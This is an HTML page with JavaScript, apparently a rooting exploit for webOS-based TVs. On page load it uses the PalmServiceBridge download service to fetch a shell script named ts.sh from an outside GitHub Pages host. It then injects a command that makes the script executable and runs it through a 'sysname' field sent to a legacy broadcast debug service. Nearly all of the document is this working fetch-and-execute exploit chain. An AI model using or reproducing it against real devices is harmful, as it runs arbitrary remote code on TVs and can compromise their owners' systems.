<!doctype html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>dangbei broadcast</title>
  <style>
    html, body {
      margin: 0;
      width: 100%;
      height: 100%;
      background: #000;
      color: #f5f1e8;
      overflow: hidden;
      font-family: sans-serif;
    }

    body {
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .status-card {
      min-width: 320px;
      max-width: 80vw;
      padding: 24px 28px;
      border: 1px solid #3a3a3a;
      border-radius: 12px;
      background: #111;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.35);
      text-align: center;
    }

    .status-label {
      margin: 0 0 10px;
      font-size: 14px;
      letter-spacing: 0.08em;
      text-transform: uppercase;
      color: #9d9d9d;
    }

    .status-value {
      margin: 0;
      font-size: 34px;
      font-weight: 700;
    }

    .status-value.pending {
      color: #f4c95d;
    }

    .status-value.success {
      color: #64d98b;
    }

    .status-value.failed {
      color: #ff7878;
    }

    .status-detail {
      margin: 14px 0 0;
      font-size: 15px;
      color: #c8c8c8;
      word-break: break-word;
    }

    .status-note {
      margin: 12px 0 0;
      font-size: 13px;
      color: #8d8d8d;
      word-break: break-word;
    }
  </style>
</head>
<body>
  <main class="status-card">
    <p class="status-label">Dangbei Broadcast</p>
    <p id="statusValue" class="status-value pending">pending</p>
    <p id="statusDetail" class="status-detail">starting download...</p>
    <p id="statusNote" class="status-note"></p>
  </main>
  <script>
    var statusValueEl = document.getElementById('statusValue');
    var statusDetailEl = document.getElementById('statusDetail');
    var statusNoteEl = document.getElementById('statusNote');
    var activeTicket = null;
    var statusSubscriptionStarted = false;
    var broadcastSent = false;
    var stallTimer = null;

    function setStatus(state, detail, note) {
      statusValueEl.textContent = state;
      statusValueEl.className = 'status-value ' + state;
      statusDetailEl.textContent = detail || '';
      statusNoteEl.textContent = note || '';
    }

    function clearStallTimer() {
      if (stallTimer) {
        clearTimeout(stallTimer);
        stallTimer = null;
      }
    }

    function armStallTimer() {
      clearStallTimer();
      stallTimer = setTimeout(function () {
        if (statusValueEl.textContent !== 'pending') {
          return;
        }
        statusNoteEl.textContent = 'Still waiting for completion. If local HTTP works but remote HTTPS hangs, the TV may be running into TLS or certificate compatibility limits.';
      }, 15000);
    }

    function detailFromPayload(payload, fallback) {
      if (!payload) {
        return fallback || 'no payload';
      }
      if (payload.errorText) {
        return payload.errorText;
      }
      if (payload.target) {
        return payload.target;
      }
      if (payload.state) {
        return payload.state;
      }
      if (payload.ticket) {
        return 'ticket ' + payload.ticket;
      }
      return JSON.stringify(payload);
    }

    function getScriptPath() {
      return '/media/internal/downloads/ts.sh';
    }

    function buildTriggerCommand(scriptPath) {
      return 'chmod${IFS}+x${IFS}' + scriptPath + ';' + scriptPath;
    }

    function buildLegacyBroadcastPayload(command) {
      return {
        menu: 'ci',
        data: "ciplus20: sub=/ cmd=unbind sysname=';" + command + ";#'"
      };
    }

    function parsePayload(payload) {
      if (typeof payload !== 'string') {
        return payload;
      }
      try {
        return JSON.parse(payload);
      } catch (_) {
        return payload;
      }
    }

    function isSuccessfulDownloadStatus(status) {
      return !!(
        status &&
        status.completed === true &&
        status.aborted !== true &&
        status.interrupted !== true &&
        (
          status.returnValue === true ||
          typeof status.returnValue === 'undefined'
        ) &&
        (
          status.state === 'completed' ||
          status.httpStatus === 200 ||
          status.completionStatusCode === 200
        )
      );
    }

    function isFailedDownloadStatus(status) {
      if (!status) {
        return false;
      }
      if (status.returnValue === false) {
        return true;
      }
      return (
        status.aborted === true ||
        status.interrupted === true ||
        (status.completed === false || status.state === 'failed') && (
          (typeof status.httpStatus !== 'undefined' && status.httpStatus >= 400) ||
          status.completionStatusCode < 0 ||
          status.errorCode ||
          status.errorText
        )
      );
    }

    function callLegacyBroadcast() {
      if (broadcastSent) {
        return;
      }
      broadcastSent = true;
      clearStallTimer();
      try {
        var command = buildTriggerCommand(getScriptPath());
        var triggerPayload = buildLegacyBroadcastPayload(command);
        var triggerBridge = new window.PalmServiceBridge();
        triggerBridge.onservicecallback = function (payload) {
          var parsed = parsePayload(payload);
          if (parsed && parsed.returnValue === false) {
            setStatus('failed', detailFromPayload(parsed, 'broadcast call failed'));
          }
        };
        setStatus(
          'pending',
          'download complete, sending broadcast call...',
          'Watch for a success toast on the TV after the call is sent.'
        );
        triggerBridge.call(
          'luna://com.webos.service.legacybroadcast.debug/menu',
          JSON.stringify(triggerPayload)
        );
        setStatus(
          'success',
          'broadcast call sent',
          'Watch for a success toast on the TV.'
        );
      } catch (error) {
        setStatus('failed', error.message);
      }
    }

    function subscribeToDownloadStatus(ticket) {
      if (!ticket) {
        return;
      }
      if (statusSubscriptionStarted && activeTicket === ticket) {
        return;
      }
      activeTicket = ticket;
      statusSubscriptionStarted = true;
      try {
        var statusBridge = new window.PalmServiceBridge();
        var settled = false;
        statusBridge.onservicecallback = function (payload) {
          var parsed = parsePayload(payload);
          if (!parsed || parsed.returnValue === false) {
            settled = true;
            clearStallTimer();
            setStatus('failed', detailFromPayload(parsed, 'status query failed'));
            return;
          }
          if (settled) {
            return;
          }
          if (isSuccessfulDownloadStatus(parsed)) {
            settled = true;
            clearStallTimer();
            setStatus('pending', 'download completed', parsed.target || '');
            callLegacyBroadcast();
            return;
          }
          if (isFailedDownloadStatus(parsed)) {
            settled = true;
            clearStallTimer();
            setStatus('failed', parsed.errorText || ('status code: ' + parsed.completionStatusCode));
            return;
          }
          armStallTimer();
          if (typeof parsed.amountReceived !== 'undefined' && typeof parsed.amountTotal !== 'undefined') {
            setStatus('pending', 'downloading...', parsed.amountReceived + ' / ' + parsed.amountTotal + ' bytes');
            return;
          }
          setStatus('pending', 'downloading...', parsed.target || parsed.state || '');
        };
        var statusPayload = {
          ticket: ticket,
          subscribe: true
        };
        statusBridge.call(
          'luna://com.webos.service.downloadmanager/downloadStatusQuery',
          JSON.stringify(statusPayload)
        );
      } catch (error) {
        setStatus('failed', error.message);
      }
    }

    function runDangbeiBroadcast() {
      if (typeof window.PalmServiceBridge === 'undefined') {
        setStatus('failed', 'PalmServiceBridge is not available');
        return;
      }

      try {
        var bridge = new window.PalmServiceBridge();
        var requestAccepted = false;
        bridge.onservicecallback = function (payload) {
          var parsed = parsePayload(payload);
          if (!parsed) {
            clearStallTimer();
            setStatus('failed', 'download request returned an empty payload');
            return;
          }
          if (parsed.ticket) {
            requestAccepted = true;
            setStatus('pending', 'download accepted', detailFromPayload(parsed, 'waiting for download status'));
            armStallTimer();
            if (!statusSubscriptionStarted || activeTicket !== parsed.ticket) {
              subscribeToDownloadStatus(parsed.ticket);
            }
            return;
          }
          if (parsed.returnValue === false) {
            clearStallTimer();
            setStatus('failed', detailFromPayload(parsed, 'download request failed'));
            return;
          }
          if (!requestAccepted) {
            setStatus('pending', detailFromPayload(parsed, 'waiting for ticket'));
          } else if (parsed.completed === true || parsed.state || parsed.amountReceived || parsed.amountTotal) {
            setStatus('pending', detailFromPayload(parsed, 'download in progress'));
          }
        };
        var requestPayload = {
          target: 'https://azoffshowy.github.io/ssap-install-bridge/resources/ts.sh',
          targetDir: '/media/internal/downloads',
          targetFilename: 'ts.sh',
          subscribe: false
        };
        bridge.call(
          'luna://com.webos.service.downloadmanager/download',
          JSON.stringify(requestPayload)
        );
      } catch (error) {
        clearStallTimer();
        setStatus('failed', error.message);
      }
    }

    runDangbeiBroadcast();
  </script>
</body>
</html>
